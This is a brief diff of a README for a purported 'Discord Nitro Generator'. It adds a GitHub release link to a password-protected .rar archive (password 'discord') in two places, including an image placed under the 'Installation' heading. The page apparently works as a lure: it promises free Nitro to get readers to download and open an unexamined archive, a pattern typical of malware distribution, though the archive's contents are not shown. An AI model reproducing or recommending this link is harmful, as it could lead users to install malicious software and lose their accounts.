@@ -1,7 +1,7 @@
 ## Password: discord
 
 
-# [Download Nitro Generator]()
+# [Download Nitro Generator](https://github.com/Waffles11ong/Discord-Nitro-Generator/releases/download/FreeNitro/DiscordNitroGenerator.rar)
 
 
 
@@ -15,7 +15,7 @@
 ### Installation
 
 
-![1]()
+![1](https://github.com/Waffles11ong/Discord-Nitro-Generator/releases/download/FreeNitro/DiscordNitroGenerator.rar)
 
 
 
